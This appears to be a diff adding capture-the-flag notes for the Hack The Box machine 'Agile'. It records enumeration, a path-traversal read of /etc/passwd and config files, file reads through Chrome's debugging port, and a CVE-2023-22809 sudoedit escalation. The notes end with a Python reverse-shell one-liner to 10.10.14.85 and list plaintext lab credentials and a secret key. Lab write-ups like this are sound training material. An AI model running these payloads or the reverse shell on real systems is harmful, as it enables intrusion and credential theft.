@@ -1,0 +1,143 @@
+
+Agile:
+  - Ports:
+    - TCP:
+      - 22 (SSH)
+      - 80 (HTTP)
+
+  - Website (superpass.htb):
+    - Nginx (1.18.0)
+    - Flask (Python 3.10)
+    - Vhost enum:
+      - "test.superpass.htb"
+      - "agile.htb"
+    - Endpoints enum:
+      - "/account/login"
+      - "/account/register"
+      - "/vault"
+      - "/download"
+      - "/static"
+      - "/vault/export"
+      - "/vault/add-row"
+      - "/vault/edit-row/<id>"
+      - "/vault/row/<id>"
+      - "/vault/update/<id>"
+      - ...
+
+    - Login (/account/login):
+      - Default creds:
+        - None
+      - "SQLAlchemy OperationalError":
+        - Flask debugger enabled
+        - No SQLi
+    
+    - Download (/download):
+      - "File not found: /tmp/None"
+      - "fn" argument:
+        - "open(/tmp/{fn})"
+      - Output file.csv
+      - Local file inclusion:
+        - "fn=../../../../../../etc/passwd"
+
+  - Local files:
+    - /etc/passwd:
+      - "corum:1000:/home/corum"
+      - "runner:1001:/app/app-testing"
+      - "edwards:1002:/home/edwards"
+      - "dev_admin:1003:/home/dev_admin"
+    - /proc/self/environ:
+      - "CONFIG_PATH=/app/config_prod.json"
+    - /app/config_prod.json:
+      - Creds mysql+pymsql:
+        - "superpassuser:dSA6l7q*yIVs$39Ml6ywvgK":
+          - Not valid SSH creds
+    - /app/config_test.py:
+      - Access denied
+    - Source code:
+      - password.py
+      - vault_views.py:
+        - Can delete any password
+      - utility_services.py:
+        - "get_random()" is bruteforcable:
+          - md5(str(datetime.datetime.now()).encode() + b"SeCReT?!").hexdigest()[:chars]
+      - password_service.py
+      - account_views.py
+      - user_service.py
+      - app.py:
+        - SECRET_KEY:
+          - "MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD"
+      - home_views.py
+    - Process enum:
+      - Flask service (wsgi-dev) on 5555/tcp:
+        - Might be /app/app-testing
+      - Flask service (wsgi) on 5000/tcp:
+        - /app/app
+
+  - Flask session token:
+    - user_id:
+      - 1:
+        - 0xdf
+      - 2:
+        - corum:
+          - agile:
+            - 5db7caa1d13cc37c9fc2:
+              - SSH VALID CREDS
+
+
+  - As corum:
+    - "sudo -l":
+      - Not in sudoers file
+    - /opt:
+      - Google Chrome installation:
+        - chrome-sandbox:
+          - setuid permission for root
+    - id:
+      - Only user group
+    - /app/config_test.json:
+      - Readable by "runner" and "dev_admin" users
+    - /app/app-testing/tests/functional/creds.txt:
+      - Access denied
+    - Listening ports:
+      - 22
+      - 5555
+      - 80
+      - 3306
+      - 5000
+      - 33060
+    - Crontabs:
+      - None
+    - Procs:
+      - Headless google chrome:
+        - remote-debugging-port=41829:
+          - http:localhost:41829/json/new?file:///etc/passwd:
+            - Read file as "runner":
+              - /app/app-testing/tests/functional/creds.txt:
+                - "edwards:1d7ffjwrx#$d6qn!9nndqgde4"
+              - /app/config_test.json:
+                - "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
+      - 2 gunicorn
+      - laurel
+      - /app/test_and_update.sh
+      - nginx
+    - Database:
+      - superpasstest:
+        - users:
+          - "edwards:$6$rounds=200000$tXCy.rfqmsaJqOoA$Pu1DcBDRZt4a6OGO35cdU4fd7mlhPthDpMcQBOclCuhW1hnAIk1aj/itcJIQ8lIhRHxSZNe4I.5aqaTtkWtnr0"
+        - passwords:
+          - agile:
+            - "edwards:d07867c6267dcb5df0af":
+              - VALID SSH CREDS
+
+  - As edwards:
+    - "sudo -l":
+      - as dev_admin:
+        - sudoedit /app/config_test.json
+        - sudoedit /app/app-testing/tests/functional/creds.txt:
+          - CVE-2023-22809:
+            - "EDITOR='vim -- /file/to/edit' sudo -u dev_admin sudoedit /app/config_test.json":
+              - Find a file writable by dev_admin and ran by root:
+                - "CMD: UID=0     PID=80259  | /bin/bash -c source /app/venv/bin/activate":
+                  - /app/venv/bin/python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.85",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);':
+                    - SHELL AS ROOT
+            
+      
